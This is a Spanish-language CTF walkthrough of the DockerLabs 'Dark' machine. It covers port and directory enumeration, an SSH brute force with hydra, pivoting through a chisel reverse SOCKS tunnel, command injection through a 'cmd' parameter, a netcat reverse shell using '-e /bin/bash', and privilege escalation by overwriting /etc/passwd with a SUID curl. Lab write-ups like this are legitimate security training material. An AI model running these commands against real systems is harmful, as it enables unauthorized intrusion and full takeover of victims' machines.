# Máquina Dark

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/Qft1jCjb#PlBLNl2jgetv_7jP9ycnsKnL4pabkeec55XWCXxbORk)

![imagen](https://github.com/user-attachments/assets/f4553d92-0867-4faf-bc13-b4422dbdd42d)


- **Nombre de la Máquina:** Dark
- **Sistema Operativo:** Linux
- **Dificultad:** Medium
- **Plataforma:** DockerLabs
- **Dirección IP:** 10.10.10.2 y 20.20.20.3
- **Vulnerabilidades Explotadas:**
  - Fuerza bruta de credenciales FTP utilizando Hydra.
  - 

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina víctima para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 10.10.10.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/1e5327f1-4ade-4463-9277-7c2af2968486)

Nos reporta los puertos 22 y 80. Realizamos un escaneo más exhaustivo para ver qué servicios corren en cada puerto.

```bash
sudo nmap -p 22,80 -sCV 10.10.10.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/1a51ac2b-ac18-4cf0-8639-9f4af2b59bf6)

Como podemos extraer del reporte de nmap, disponemos de los servicios SSH y Apache.

En el puerto 80, vemos una página con un label y un botón en el que nos especifíca que ingresemos una URL.

![imagen](https://github.com/user-attachments/assets/84c3a062-4b39-483c-8935-be01097480fb)

Usaremos `gobuster` para ver ue directorios podemos encontrarnos en esta web.
```bash
gobuster dir -u 'http://10.10.10.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt
```

![imagen](https://github.com/user-attachments/assets/efe57f03-4831-4b2b-92b0-3244a6de2fe4)

Encontramos un directorio llamado `/info` el cuál si accedemos, pone lo siguiente:

![imagen](https://github.com/user-attachments/assets/2c8f6db7-3153-49b4-a95d-a64e7383d61d)

Tenemos el posible nombre de usuario **Toni**, vamos a urilizarlo para hacer fuerza bruta vía ssh.

### Fuerza bruta con hydra
Usaremos el nombre toni como parámetro de usuario y usaremos el rockyou como diccionario para la fuerza bruta.

```bash
hydra -l "toni" -P /usr/share/wordlists/rockyou.txt 10.10.10.2 ssh -t 64
```

![imagen](https://github.com/user-attachments/assets/ae82840a-7347-43d9-b407-b69d99b10609)

- Usuario: toni
- Password: banana

## Intrusión y Pivoting a máquina 20.20.20.3
Accedemos vía ssh al usuario toni, con el comando `hostname -I` podemos observar que tiene activa otra interfaz de red.

![imagen](https://github.com/user-attachments/assets/9a06c4fe-80eb-4720-a1f9-6e7db2448ccb)

No encuentro la manera posible de escalar privilegios a root en esta máquina, ni usando linpeas así que usaremos chisel para generar un tunel que redirija el tráfico de la máquina 20.20.20.3 a nuestra máquina atacante.
Nos pasamos chisel a la máquina 10.10.10.2 usando curl.

![imagen](https://github.com/user-attachments/assets/349c59d2-c61a-4ba3-bcca-2deeeeeaf305)

Ahora desde nuestra máquina nos pondremos en escucha con chisel.

```bash
./chisel_1.9.1_linux_arm64 server --reverse -p 443
```

![imagen](https://github.com/user-attachments/assets/e06e2a39-9845-4a58-a33c-0cb0f9449ee6)

Y en la máquina víctima con ip 10.10.10.2 crearemos el tunel para ver el tráfico de la red 20.20.20.3 desde nuestra ip 10.10.10.1:

```bash
./chisel client 10.10.10.1:443 R:socks
```

![imagen](https://github.com/user-attachments/assets/b6d572db-7854-433c-8346-6695230e4f9e)

![imagen](https://github.com/user-attachments/assets/7faff50f-2c2b-4a04-ab1e-cd8638e86b08)

Genial ya nos funciona como nos decía que tenia una web donde había subido la base de datos de la DGT etc…,vamos a configurar foxyproxy para acceder a la web de esa IP.

![imagen](https://github.com/user-attachments/assets/30beb3ea-1af9-4e44-ad89-c8d8c04bcb93)

Ahora podremos acceder al sitio web 20.20.20.3

![imagen](https://github.com/user-attachments/assets/84131226-e941-4a1d-9ab9-0f8664271249)

Usaremos Gobuster para encontrar posibles directorios dentro de esta web.

```bash
sudo gobuster dir -u 'http://20.20.20.3/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt --proxy socks5://127.0.0.1:1080
```

![imagen](https://github.com/user-attachments/assets/bf853816-8e9c-4561-9451-e10623589752)

No encontramos nada interesante que no hayamos visto ya, pero haciendo un poco de investigación me doy cuenta de que existe un parámetro llamado cmd en el código fuente de la página.

![imagen](https://github.com/user-attachments/assets/17db05d9-af26-4789-b3a8-6ce9c2dd97e1)

Por curiosidad introduzco el comando `whoami` y me dice `www-data`, así que ya tenemos la manera de mandarnos una reverse shell y trabajar más comodamente, pero la reverse shell deberemos mandarla a la máquina 20.20.20.2 que sería la del usuario toni.
Nos pondremos en escucha por el puerto 1010.

```bash
nc -nlvp 1010
```
```bash
nc 20.20.20.2 1010 -e /bin/bash
```

![imagen](https://github.com/user-attachments/assets/cd1d7326-51c0-4318-8ea1-401b3a3b261b)


![imagen](https://github.com/user-attachments/assets/dc2d405b-3da2-4ad5-8765-87136ef86c07)

## Escalada de privilegios en máquina 20.20.20.3
Encontramos que tenemos permisos SUID usando el comando curl, por lo que se me ocurre es copiar y pegar el `/etc/passwd` para modificarlo y quitarle la X a root.

![imagen](https://github.com/user-attachments/assets/a199db2d-9f62-44fb-87bc-0ef51f8b45e6)

```bash
cp /etc/passwd .
nano passwd
```

![imagen](https://github.com/user-attachments/assets/ad5c9361-d678-4ab9-90cd-4be580b5130f)

```bash
curl file:///tmp/passwd -o /etc/passwd
```

![imagen](https://github.com/user-attachments/assets/855b4c6b-b5f8-4f3c-9fd3-29c5f848e554)

Ahora tan solo ejecutando el comando `su root` nos convertiremos en usuario root y habremos completado la máquina al completo.

![imagen](https://github.com/user-attachments/assets/720a0580-3a66-48f1-a98c-66c7b582b677)

